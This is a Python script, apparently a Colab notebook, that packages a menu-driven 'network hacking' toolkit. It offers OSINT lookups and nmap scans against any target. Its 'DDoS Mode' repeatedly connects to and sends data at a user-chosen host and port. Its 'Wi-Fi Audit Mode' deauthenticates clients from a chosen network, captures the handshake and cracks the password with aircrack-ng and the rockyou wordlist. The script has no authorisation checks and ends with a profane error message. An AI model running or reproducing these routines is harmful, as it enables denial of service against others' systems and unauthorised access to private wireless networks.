!apt-get update
!apt-get install nmap -y
!pip install python-whois
!pip install dnspython
import requests
import socket
import whois
import dns.resolver
import subprocess
import os
import json
from datetime import datetime
import time
import sys
import string
from urllib.parse import urlparse
import csv
import signal


USE_COLOR = True  # set to False for plain text

CYAN = "\033[96m" if USE_COLOR else ""
GREEN = "\033[92m" if USE_COLOR else ""
RESET = "\033[0m" if USE_COLOR else ""

USE_COLOR = True  # set to False for plain text

CYAN = "\033[96m" if USE_COLOR else ""
GREEN = "\033[92m" if USE_COLOR else ""
RESET = "\033[0m" if USE_COLOR else ""

logo = f"""
{CYAN} _____  ___    _______  ___________  ________  _______   ______
("   \\|"  \\  /"     "|("     _   ")/"       )/"     "| /" _  "\
|.\\   \\    |(: ______) )__/  \\__/(:   \\___/(: ______)(: ( \\___)
|: \\.   \\\\  | \\/    |      \\_ /    \\___  \\   \\/    |   \\/ \\
|.  \\    \\. | // ___)_     |.  |     __/  \\\\  // ___)_  //  \\ _
|    \\    \\ |(:      "|    \\:  |    /" \\   :)(:      "|(:   _) \\
 \\___|\\____\\) \\_______)     \\__|   (_______/  \\_______) \\_______)

{RESET}
{GREEN}           NETWORK SECURITY TOOLKIT{RESET}
"""

print(logo)


# ================= BUFFER =================
report = []
confidence = 0

def write(text):
    print(text)
    report.append(text)

def reset_session():
    global report, confidence
    report = []
    confidence = 0

def add_confidence(points):
    global confidence
    confidence += points

# Helper function from original DDoS script, though not directly used in new menu flow
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

curdir = os.getcwd()

# ================= OSINT TOOLS =================

def ip_lookup(target):
    write("[IP GEOLOCATION]")
    try:
        data = requests.get(f"http://ip-api.com/json/{target}").json()

        usable_keys = ["country", "regionName", "city", "isp", "org", "as", "lat", "lon"]
        for k in usable_keys:
            if k in data and data[k]:
                write(f"{k}: {data[k]}")
                add_confidence(1)
    except requests.exceptions.RequestException as e:
        write(f"IP Geolocation lookup failed: {e}")

def reverse_dns(target):
    write("\n[REVERSE DNS]")
    try:
        host = socket.gethostbyaddr(target)
        write(f"Hostname: {host[0]}")
        add_confidence(2)
    except socket.herror:
        write("No reverse DNS found")
    except Exception as e:
        write(f"Reverse DNS lookup failed: {e}")

def dns_lookup(domain):
    write("\n[DNS RECORDS]")
    found = False
    for rtype in ["A", "AAAA", "MX", "NS", "TXT"]:
        try:
            records = dns.resolver.resolve(domain, rtype)
            write(f"{rtype}:")
            for r in records:
                write(f" - {r}")
            found = True
            add_confidence(1)
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
            pass
        except Exception as e:
            write(f"Error resolving {rtype} for {domain}: {e}")
    if not found:
        write("No useful DNS records found")

def whois_lookup(target):
    write("\n[WHOIS]")
    try:
        data = whois.whois(target)
        for k, v in data.items():
            if not v:
                continue
            text = str(v).lower()
            if "redacted" in text or "privacy" in text:
                continue
            write(f"{k}: {v}")
            add_confidence(1)
    except Exception as e:
        write(f"WHOIS lookup failed: {e}")

def rdap_lookup(domain):
    write("\n[RDAP]")
    try:
        r = requests.get(f"https://rdap.org/domain/{domain}", timeout=5)
        r.raise_for_status() # Raise an exception for HTTP errors
        data = r.json()

        if "ldhName" in data:
            write(f"Domain: {data['ldhName']}")
            add_confidence(1)

        if "nameservers" in data:
            write("Nameservers:")
            for ns in data["nameservers"]:
                write(f" - {ns.get('ldhName')}")
            add_confidence(1)

        if "events" in data:
            for e in data["events"]:
                if e.get("eventAction") in ["registration", "expiration"]:
                    write(f"{e['eventAction']}: {e['eventDate']}")
                    add_confidence(1)
    except requests.exceptions.RequestException as e:
        write(f"RDAP lookup failed: {e}")
    except Exception as e:
        write(f"RDAP lookup failed: {e}")

def reverse_ip(target):
    write("\n[REVERSE IP]")
    try:
        ip = socket.gethostbyname(target)
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=5)
        r.raise_for_status()

        if "error" in r.text.lower():
            write("Reverse IP lookup unavailable or error from service.")
            return

        domains = r.text.strip().splitlines()
        if domains:
            write("Domains on same IP:")
            for d in domains[:20]: # Limit output to 20 domains for readability
                write(f" - {d}")
            add_confidence(2)
        else:
            write("No domains found on this IP.")
    except requests.exceptions.RequestException as e:
        write(f"Reverse IP lookup failed: {e}")
    except socket.gaierror:
        write(f"Could not resolve hostname for target: {target}")
    except Exception as e:
        write(f"Reverse IP lookup failed: {e}")

def http_headers(target):
    write("\n[HTTP HEADERS]")
    try:
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target
        r = requests.get(target, timeout=5, allow_redirects=True)
        r.raise_for_status()
        for k, v in r.headers.items():
            write(f"{k}: {v}")
        add_confidence(1)
    except requests.exceptions.MissingSchema:
        write(f"Invalid URL scheme or format for {target}")
    except requests.exceptions.RequestException as e:
        write(f"HTTP header grab failed: {e}")
    except Exception as e:
        write(f"HTTP header grab failed: {e}")

def traceroute(target):
    write("\n[TRACEROUTE]")
    cmd = ["tracert", target] if os.name == "nt" else ["traceroute", target]
    try:
        # Ensure target is valid IP/domain to avoid command injection with subprocess
        if not (socket.gethostbyname(target) or target.replace('.', '').isdigit()):
            write("Invalid target for traceroute.")
            return

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate()

        if stdout:
            write(stdout.strip())
            add_confidence(1)
        if stderr:
            write("Traceroute Errors:")
            write(stderr.strip())

    except FileNotFoundError:
        write("Traceroute command not found. Please ensure it's installed and in your PATH.")
    except socket.gaierror:
        write(f"Could not resolve hostname for traceroute target: {target}")
    except Exception as e:
        write(f"Traceroute failed: {e}")

# ================= OSINT MODE =================

def osint_mode(target):
    write("=== OSINT MODE START ===\n")

    ip_lookup(target)

    if target.replace(".", "").isdigit(): # Check if target is likely an IP address
        reverse_dns(target)
    else:
        dns_lookup(target)
        rdap_lookup(target)
        reverse_ip(target)
        http_headers(target)

    whois_lookup(target)

    write("\n=== OSINT MODE END ===")
    write(f"\n[CONFIDENCE SCORE]: {confidence}/20")

# ================= NMAP SCAN =================

def nmap_scan(target):
    write("\n[NMAP SCAN]")
    print("Choose Nmap scan type:")
    print("1) Default Scan (SYN scan -sS)")
    print("2) Version Detection (-sV)")
    print("3) OS Detection (-O)")
    print("4) Aggressive Scan (-A)")
    print("5) Custom Options (e.g., -p 1-1000 -T4)")
    scan_choice = input("Enter choice (1-5): ").strip()

    nmap_args = []
    if scan_choice == '1':
        nmap_args = ["-sS"]
        write("Performing default SYN scan...")
    elif scan_choice == '2':
        nmap_args = ["-sV"]
        write("Performing version detection scan...")
    elif scan_choice == '3':
        nmap_args = ["-O"]
        write("Performing OS detection scan...")
    elif scan_choice == '4':
        nmap_args = ["-A"]
        write("Performing aggressive scan...")
    elif scan_choice == '5':
        custom_options_str = input("Enter custom Nmap options (e.g., -p 80,443 -T4): ").strip()
        if custom_options_str:
            nmap_args = custom_options_str.split()
            write(f"Performing custom Nmap scan with options: {custom_options_str}...")
        else:
            write("No custom options entered, performing default SYN scan.")
            nmap_args = ["-sS"]
    else:
        write("Invalid Nmap scan choice, performing default SYN scan.")
        nmap_args = ["-sS"]

    cmd = ["nmap"] + nmap_args + [target]
    write(f"Running Nmap command: {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False)

        write("\n--- Nmap Output ---")
        if proc.stdout:
            write(proc.stdout.strip())
        else:
            write("No standard output from Nmap.")

        if proc.stderr:
            write("\n--- Nmap Errors ---")
            write(proc.stderr.strip())
            add_confidence(-1) # Deduct confidence for Nmap errors

        if "Nmap done: 1 IP address (1 host up)" in proc.stdout:
            write("Nmap reported host as up and potentially found services.")
            add_confidence(3)
        elif "Nmap done: 1 IP address (0 hosts up)" in proc.stdout:
            write("Nmap reported host as down or unreachable.")
        elif "Ports scanned" in proc.stdout:
            write("Nmap completed a port scan.")
            add_confidence(2)
        else:
            add_confidence(1) # Some output is better than none

    except FileNotFoundError:
        write("Nmap command not found. Please ensure Nmap is installed and in your system's PATH.")
    except Exception as e:
        write(f"An unexpected error occurred during Nmap scan: {e}")

# ================= DDOS FUNCTIONALITY =================

def dos(host, ip, port, message):
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Attempt to connect to the specified host and port
        ddos.connect((ip, int(port)))
        # Send messages
        ddos.send(message.encode())
        # Also send using sendto (UDP, but SOCK_STREAM is TCP, might not behave as intended)
        # For a simple demo, keeping as is, but typically one would choose TCP or UDP.
        # If the socket is SOCK_STREAM (TCP), sendto might not be appropriate for established connection.
        # Original code used `ddos.sendto(message.encode(), (ip, int(port)))` with a TCP socket,
        # which is redundant or incorrect for a connected TCP socket.
        # Removed for correctness of TCP; if UDP is intended, socket type should be SOCK_DGRAM.
        # For the purpose of DDoS simulation, simply sending over the established TCP connection is sufficient.
        ddos.send(message.encode())
        write(f"|[DDoS Packet Sent to {host}:{port}]|")
        add_confidence(0.5) # Small confidence for each packet sent
    except socket.error as msg:
        write(f"|[Connection Failed to {host}:{port}]| - {msg}")
    except Exception as e:
        write(f"|[Error sending DDoS packet to {host}:{port}]| - {e}")
    finally:
        ddos.close()

def ddos_mode():
    write("=== DDoS MODE START ===")
    while True:
        host_input = input("Site you want to target (e.g., example.com or http://example.com): ").strip()
        port_str = input("Port you want to attack (e.g., 80): ").strip()
        message = input("Input the message you want to send (e.g., 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'): ").strip()
        conn_str = input("How many connections/packets you want to attempt: ").strip()

        if not host_input or not port_str.isdigit() or not conn_str.isdigit():
            write("Invalid input. Please provide a valid host, port (number), and number of connections (number).")
            continue

        port = int(port_str)
        num_connections = int(conn_str)

        try:
            parsed_url = urlparse(host_input)
            # Use hostname from parsed URL if available, otherwise assume host_input is hostname/IP
            host = parsed_url.hostname if parsed_url.hostname else host_input

            ip = socket.gethostbyname(host)
            write(f"Target resolved to IP: {ip}")
            write(f"Attempting {num_connections} connections to {host} on port {port}")
            write("+----------------------------+")

            for i in range(num_connections):
                dos(host, ip, port, message)
                time.sleep(0.01) # Small delay to prevent overwhelming local resources

            write("+----------------------------+")
            write(f"The requested {num_connections} connections finished.")
            add_confidence(5) # Add significant confidence for completing a DDoS attempt

        except socket.gaierror:
            write(f"Could not resolve hostname: {host_input}. Please check the domain or IP address.")
        except Exception as e:
            write(f"An unexpected error occurred during DDoS mode operation: {e}")

        answer = input("Do you want to send more connections? (y/n): ").strip().lower()
        if answer not in ["y", "yes"]:
            break
    write("=== DDoS MODE END ===")

# ================= WI-FI AUDITING FUNCTIONALITY =================

ROCKYOU_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
OUTPUT_PREFIX = "wifi_scan"

def download_wordlist():
    if not os.path.exists("rockyou.txt"):
        write("[*] Downloading rockyou.txt...")
        # Use !curl for Colab shell command execution
        subprocess.run(f"curl -L {ROCKYOU_URL} -o rockyou.txt", shell=True)
    return "rockyou.txt"

def cleanup_old_files():
    write("[*] Cleaning up old capture files...")
    for f in os.listdir(curdir):
        if f.startswith(OUTPUT_PREFIX) and (f.endswith('.csv') or f.endswith('.kismet.csv')):
            os.remove(f)
            write(f"Removed {f}")
        if f.startswith('capture-') and f.endswith('.cap'):
            os.remove(f)
            write(f"Removed {f}")

def list_interfaces():
    write("[*] Listing available network interfaces...")
    try:
        # Using subprocess to run airmon-ng and capture output
        proc = subprocess.run("sudo airmon-ng", capture_output=True, text=True, shell=True, check=True)
        write(proc.stdout)
        return proc.stdout # Return output for user to see interfaces
    except subprocess.CalledProcessError as e:
        write(f"Error listing interfaces: {e.stderr}")
        return None
    except FileNotFoundError:
        write("airmon-ng command not found. Please ensure aircrack-ng suite is installed.")
        return None

def get_targets(interface):
    """Scans for 10 seconds and parses the BSSIDs and Channels."""
    write(f"[*] Scanning for 10 seconds on {interface}... Please wait.")

    csv_path = f"{OUTPUT_PREFIX}-01.csv"
    # Remove existing scan files to ensure clean capture
    for f in os.listdir(curdir):
        if f.startswith(OUTPUT_PREFIX) and (f.endswith('.csv') or f.endswith('.kismet.csv')):
            os.remove(f)

    # Run airodump-ng in the background and kill it after 10 seconds
    # Using 'timeout' command for safety and reliability.
    cmd = f"sudo timeout 10 airodump-ng --write {OUTPUT_PREFIX} --output-format csv {interface}"
    subprocess.run(cmd, shell=True)

    targets = []
    if os.path.exists(csv_path):
        with open(csv_path, mode='r') as f:
            reader = csv.reader(f)
            for row in reader:
                # Wi-Fi networks in the CSV start after the BSSID header
                if len(row) >= 14 and row[0].count(':') == 5: # Basic check for BSSID format
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()
                    if essid: # Only add if it has a name
                        targets.append({"bssid": bssid, "channel": channel, "essid": essid})
    return targets

def wifi_audit_mode():
    write("=== WI-FI AUDIT MODE START ===")
    cleanup_old_files()
    wordlist = download_wordlist()

    # 1. Select Interface
    list_interfaces()
    iface = input("\nEnter your wireless interface (e.g., wlan0): ").strip()

    write(f"[*] Starting monitor mode on {iface}...")
    try:
        # Ensure airmon-ng is run with sudo
        start_mon_proc = subprocess.run(f"sudo airmon-ng start {iface}", shell=True, capture_output=True, text=True)
        write(start_mon_proc.stdout)
        write(start_mon_proc.stderr)
        # Extract monitor interface name, typically ends with 'mon'
        mon_iface_line = [line for line in start_mon_proc.stdout.splitlines() if "(monitor mode enabled on" in line]
        if mon_iface_line:
            mon_iface = mon_iface_line[0].split('(')[0].strip().split()[-1]
            write(f"Monitor interface detected: {mon_iface}")
        else:
            mon_iface = input("Could not automatically detect monitor interface. Please enter it (e.g., wlan0mon): ").strip()

    except subprocess.CalledProcessError as e:
        write(f"Error starting monitor mode: {e.stderr}")
        write("Exiting Wi-Fi Audit Mode.")
        return
    except FileNotFoundError:
        write("airmon-ng command not found. Please ensure aircrack-ng suite is installed.")
        write("Exiting Wi-Fi Audit Mode.")
        return

    # 2. Scan and Pick Target
    targets = get_targets(mon_iface)
    if not targets:
        write("No Wi-Fi networks found. Exiting Wi-Fi Audit Mode.")
        # Stop monitor mode before exiting
        subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)
        return

    write("\nID  |  BSSID              | CH | ESSID (Name)")
    write("-" * 50)
    for i, t in enumerate(targets):
        write(f"{i:<3} | {t['bssid']} | {t['channel']:<2} | {t['essid']}")

    try:
        choice = int(input("\nEnter the ID of the network to crack: ").strip())
        target = targets[choice]
    except (ValueError, IndexError):
        write("Invalid choice. Exiting Wi-Fi Audit Mode.")
        # Stop monitor mode before exiting
        subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)
        return

    # 3. Capture & Deauth
    write(f"[*] Target locked: {target['essid']} on Channel {target['channel']}")
    add_confidence(2)

    # Start Sniffer
    capture_file = "capture"
    sniff_cmd = f"sudo airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {capture_file} {mon_iface}"
    write(f"[*] Starting packet capture: {sniff_cmd}")
    sniff_proc = subprocess.Popen(sniff_cmd, shell=True, preexec_fn=os.setsid) # Use os.setsid to create a new process group

    # Give the sniffer a second to warm up, then Deauth
    time.sleep(5) # Increased sleep to ensure airodump-ng starts capturing
    write("[!] Sending Deauth to force handshake... (5 packets)")
    deauth_cmd = f"sudo aireplay-ng -0 5 -a {target['bssid']} {mon_iface}"
    subprocess.run(deauth_cmd, shell=True)
    add_confidence(3)

    write("\n[!] Airodump-ng is running in the background. Look for 'WPA Handshake' in its output.")
    write("\n[!] Press Ctrl+C in THIS CELL to stop packet capture and start cracking.")
    try:
        # Keep the script running to allow user to monitor airodump-ng output
        # and press Ctrl+C when handshake is captured.
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        write("\n[!] Ctrl+C detected. Stopping packet capture...")
        os.killpg(os.getpgid(sniff_proc.pid), signal.SIGTERM) # Terminate the process group
        sniff_proc.wait()

    # Stop monitor mode
    write(f"[*] Stopping monitor mode on {mon_iface}...")
    subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)

    # 4. Crack
    cap_file_path = f"{capture_file}-01.cap"
    if os.path.exists(cap_file_path):
        write(f"\n[*] Starting crack attempt on {target['essid']} using {wordlist}...")
        crack_cmd = f"sudo aircrack-ng -w {wordlist} -b {target['bssid']} {cap_file_path}"
        crack_proc = subprocess.run(crack_cmd, shell=True, capture_output=True, text=True)
        write(crack_proc.stdout)
        write(crack_proc.stderr)
        if "KEY FOUND!" in crack_proc.stdout:
            write("\n[!!!] WE GOT THE PASSWORD! CHECK ABOVE [!!!]")
            add_confidence(10)
        else:
            write("\n[i] Password not found in wordlist.")
            add_confidence(-5) # Deduct if crack fails
    else:
        write(f"Error: Capture file {cap_file_path} not found. Handshake might not have been captured.")
        add_confidence(-2)

    write("=== WI-FI AUDIT MODE END ===")

# ================= EXPORT =================

def export_report():
    if not report:
        print("Nothing to export.")
        return

    name = input("Filename (no extension): ").strip()
    fmt = input("Format (txt/json): ").lower()

    if not name:
        print("Filename cannot be empty. Aborting export.")
        return

    try:
        if fmt == "json":
            data = {
                "generated": datetime.now().isoformat(),
                "confidence_score": confidence,
                "report": report
            }
            with open(name + ".json", "w") as f:
                json.dump(data, f, indent=4)
        else:
            with open(name + ".txt", "w") as f:
                f.write("\n".join(report))
        print("Report exported successfully.")
    except IOError as e:
        print(f"Error exporting report: {e}")
    except Exception as e:
        print(f"An unexpected error occurred during report export: {e}")

# ================= MENU =================

def menu():
    print("\nNetsec Labs Network Hacking Tools Made by Ajay Easwarachandran")
    print("1) OSINT Mode")
    print("2) Nmap Scan")
    print("3) DDoS Mode")
    print("4) Wi-Fi Audit Mode")
    print("5) Export Report")
    print("0) Exit")

while True:
    menu()
    choice = input("Select option: ").strip()

    if choice == "0":
        write("Exiting Orbit Network Tools.")
        break

    # Reset session for new operations, but not for Wi-Fi Audit or exporting reports
    if choice not in ["4", "5"]:
        reset_session()

    if choice == "1":
        target = input("Enter IP or domain for OSINT: ").strip()
        if target:
            osint_mode(target)
        else:
            write("Target cannot be empty. Returning to menu.")
    elif choice == "2":
        target = input("Enter IP or domain for Nmap scan: ").strip()
        if target:
            nmap_scan(target)
        else:
            write("Target cannot be empty. Returning to menu.")
    elif choice == "3":
        ddos_mode()
    elif choice == "4":
        wifi_audit_mode()
    elif choice == "5":
        export_report()
    else:
        write("Invalid option. Choose from the fucking menu dumbass.")
